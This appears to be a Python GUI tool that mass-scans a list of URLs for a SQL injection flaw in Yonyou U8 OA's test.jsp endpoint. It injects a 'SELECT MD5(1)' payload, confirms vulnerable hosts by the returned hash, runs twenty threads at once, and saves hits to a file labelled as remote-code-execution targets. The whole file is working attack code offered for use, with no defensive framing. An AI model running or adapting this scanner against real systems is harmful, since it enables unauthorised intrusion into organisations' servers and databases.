import requests
import tkinter as tk
from tkinter import scrolledtext
from tkinter import *
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def yyu8_testsql_exp(url):
    poc = r"""/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            yyu8_testsql_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            yyu8_testsql_text.see(END)
            with open ("[exists]yyu8_test_sql_RCE_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            yyu8_testsql_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            yyu8_testsql_text.see(END)
    except Exception as err:
        yyu8_testsql_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        yyu8_testsql_text.see(END)
def get_yyu8_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def yyu8_testsql_gui():
    yyu8_testsql = Toplevel()
    yyu8_testsql.geometry("1035x455")
    yyu8_testsql.title("yonyou U8 OA test.jsp SQLinjection [auto-muti-exp]")
    yyu8_testsql.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    yyu8_testsql.tk.call('wm', 'iconphoto', yyu8_testsql._w, logo)
    global yyu8_testsql_text
    yyu8_testsql_text = scrolledtext.ScrolledText(yyu8_testsql,width=123, height=25)
    yyu8_testsql_text.grid(row=0, column=0, padx=10, pady=10)
    yyu8_testsql_text.see(END)
    addrs = get_yyu8_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(yyu8_testsql_exp, addr)
    yyu8_testsql.mainloop()